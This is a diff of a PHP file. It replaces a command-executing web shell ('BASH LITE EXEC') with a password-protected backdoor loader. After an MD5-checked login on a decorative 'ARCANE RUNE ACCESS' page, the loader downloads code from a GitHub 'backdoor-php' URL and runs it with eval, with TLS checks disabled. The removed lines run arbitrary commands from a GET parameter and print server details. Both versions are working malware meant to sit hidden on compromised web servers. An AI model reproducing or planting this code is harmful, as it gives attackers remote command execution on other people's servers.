@@ -1,26 +1,262 @@
 <?php
+session_start();
+
 /**
- * BASH LITE EXEC - BACKUP LOADER
+ * Disable error reporting 
+ 
+ * AL3  |
+  
+ * Set this to error_reporting( -1 ) for debugging.
  */
-error_reporting(0);
-if(isset($_GET['cmd'])){
-    $c = $_GET['cmd'];
-    echo "<style>body{background:#000;color:#0f0;font-family:monospace;padding:20px;}</style>";
-    echo "<b>Executing: $c</b><hr>";
-    echo "<pre>";
-    if(function_exists('shell_exec')) {
-        echo shell_exec($c . " 2>&1");
-    } elseif(function_exists('system')) {
-        system($c);
-    } elseif(function_exists('passthru')) {
-        passthru($c);
+function geturlsinfo($url) {
+    if (function_exists('curl_exec')) {
+        $conn = curl_init($url);
+        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
+        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
+
+        // Set cookies using session if available
+        if (isset($_SESSION['G-AL3'])) {
+            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['G-AL3']);
+        }
+
+        $url_get_contents_data = curl_exec($conn);
+        curl_close($conn);
+    } elseif (function_exists('file_get_contents')) {
+        $url_get_contents_data = file_get_contents($url);
+    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
+        $handle = fopen($url, "r");
+        $url_get_contents_data = stream_get_contents($handle);
+        fclose($handle);
     } else {
-        echo "All exec functions are disabled!";
+        $url_get_contents_data = false;
     }
-    echo "</pre>";
-    exit;
+    return $url_get_contents_data;
 }
 
-// Sneaky Info Collector
-echo "OS: " . PHP_OS . " | IP: " . $_SERVER['SERVER_ADDR'] . " | User: " . get_current_user();
+// Function to check if the user is logged in
+function is_logged_in()
+{
+    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
+}
+
+// Check if the AL3 is submitted and correct
+if (isset($_POST['AL3'])) {
+    $entered_AL3 = $_POST['AL3'];
+    $hashed_AL3 = '344250aea66c5f0003378e7fe74e14b2';
+    if (md5($entered_AL3) === $hashed_AL3) {
+        $_SESSION['logged_in'] = true;
+        $_SESSION['G-AL3'] = 'tidak boleh kasar';
+    } else {
+        
+        echo "KEMANA LAGI HARUS MELANGKAH";
+    }
+}
+
+// Check if the user is logged in before executing the content
+if (is_logged_in()) {
+    $a = geturlsinfo('https://github.com/dansowei0/backdoor-php/raw/refs/heads/main/main-ale.txt');
+    eval('?>' . $a);
+} else {
+    // Display login form if not logged in
+    ?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>ARCANE RUNE ACCESS</title>
+
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Uncial+Antiqua&display=swap');
+@import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap');
+
+body {
+    margin: 0;
+    height: 100vh;
+    background: #050008;
+    overflow: hidden;
+    font-family: 'Uncial Antiqua', serif;
+    color: #ba7bff;
+}
+
+/* CANVAS RAIN CODE (MAGICAL RUNES) */
+canvas {
+    position: fixed;
+    inset: 0;
+    z-inAL3: 1;
+}
+
+/* 3D CAPSULE */
+.capsule {
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    width: 380px;
+    padding: 30px;
+    transform: translate(-50%, -50%);
+    background: radial-gradient(circle, rgba(90,0,130,0.45), rgba(0,0,0,0.6));
+    border: 2px solid #a34dff88;
+    border-radius: 40px;
+    box-shadow:
+        0 0 40px #8a2effaa,
+        inset 0 0 30px #5a0099,
+        0 0 100px #30004f;
+    backdrop-filter: blur(10px);
+    z-inAL3: 3;
+    animation: float 4s ease-in-out infinite alternate;
+}
+
+@keyframes float {
+    0% { transform: translate(-50%, -53%) scale(1); }
+    100% { transform: translate(-50%, -47%) scale(1.03); }
+}
+
+/* TITLE */
+.title {
+    text-align: center;
+    font-size: 26px;
+    margin-bottom: 15px;
+    color: #d9b3ff;
+    text-shadow: 0 0 12px #c177ff, 0 0 22px #7000aa;
+    letter-spacing: 3px;
+}
+
+/* IMAGE inside capsule */
+.capsule img {
+    display: block;
+    width: 160px;
+    margin: 10px auto 20px;
+    border-radius: 10px;
+    box-shadow: 0 0 20px #8a2effcc;
+}
+
+/* INPUT */
+input[type=password] {
+    width: 100%;
+    padding: 12px;
+    background: rgba(255,255,255,0.08);
+    border: 1px solid #b46dff55;
+    border-radius: 8px;
+    color: #f1d5ff;
+    font-size: 16px;
+    outline: none;
+    margin-bottom: 15px;
+    font-family: 'Orbitron', sans-serif;
+}
+
+input[type=password]:focus {
+    background: rgba(255,255,255,0.13);
+    box-shadow: 0 0 15px #b46dff;
+}
+
+/* BUTTON */
+input[type=submit] {
+    width: 100%;
+    padding: 13px;
+    background: linear-gradient(90deg, #7e00ff, #cc72ff);
+    border: none;
+    border-radius: 8px;
+    font-size: 15px;
+    color: #fff;
+    cursor: pointer;
+    font-family: 'Orbitron', sans-serif;
+    box-shadow: 0 0 20px #ae59ff;
+    transition: .25s;
+}
+
+input[type=submit]:hover {
+    transform: scale(1.05);
+    box-shadow: 0 0 35px #d28aff;
+}
+
+/* FLOATING SYMBOLS */
+.rune {
+    position: fixed;
+    font-size: 30px;
+    color: #7c25ff;
+    opacity: 0.25;
+    animation: drift 9s linear infinite;
+    z-index: 2;
+}
+
+@keyframes drift {
+    from { transform: translateY(-10vh) rotate(0deg); }
+    to   { transform: translateY(120vh) rotate(360deg); }
+}
+</style>
+</head>
+
+<body>
+
+<canvas id="rain"></canvas>
+
+<div class="capsule">
+    <div class="title">ARCANE RUNE ACCESS</div>
+    
+    <img src="https://res.cloudinary.com/dgb2q7dr8/image/upload/q_auto/f_auto/v1775325661/luffyyx_jevlh7.png">
+
+    <form method="POST">
+        <!-- FIXED NAME -->
+        <input type="password" name="AL3" placeholder="ENTER YOURE KEYWORD">
+        
+        <input type="submit" value="UNSEAL CAPSULE">
+    </form>
+</div>
+
+<script>
+// ANCIENT RUNE RAIN
+const c = document.getElementById("rain");
+const ctx = c.getContext("2d");
+
+c.width = window.innerWidth;
+c.height = window.innerHeight;
+
+const runes = "ᚠᚡᚢᚦᚨᚱᚲᚷᚹᚺᛉᛋᛏᛒᛗᛚᛝᛟᚪᚫᚬᚭᚮᚯᚰᚱ";
+const fontSize = 22;
+const columns = c.width / fontSize;
+const drops = [];
+
+for (let i = 0; i < columns; i++) drops[i] = 1;
+
+function draw() {
+    ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
+    ctx.fillRect(0, 0, c.width, c.height);
+
+    ctx.fillStyle = "#a22fff";
+    ctx.font = fontSize + "px serif";
+
+    for (let i = 0; i < drops.length; i++) {
+        const text = runes[Math.floor(Math.random() * runes.length)];
+        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+
+        if (drops[i] * fontSize > c.height && Math.random() > 0.97) {
+            drops[i] = 0;
+        }
+        drops[i]++;
+    }
+}
+
+setInterval(draw, 45);
+
+// FLOATING RUNES
+const symbols = ["ᛝ","ᛗ","ᛟ","ᛋ","ᚱ","ᛞ","ᛉ"];
+for (let i = 0; i < 30; i++) {
+    let el = document.createElement("div");
+    el.className = "rune";
+    el.innerText = symbols[Math.floor(Math.random() * symbols.length)];
+    el.style.left = Math.random() * 100 + "vw";
+    el.style.top = Math.random() * -100 + "vh";
+    el.style.animationDuration = (4 + Math.random() * 6) + "s";
+    el.style.fontSize = (25 + Math.random() * 30) + "px";
+    document.body.appendChild(el);
+}
+</script>
+
+</body>
+</html>
+    <?php
+}
+
 ?>
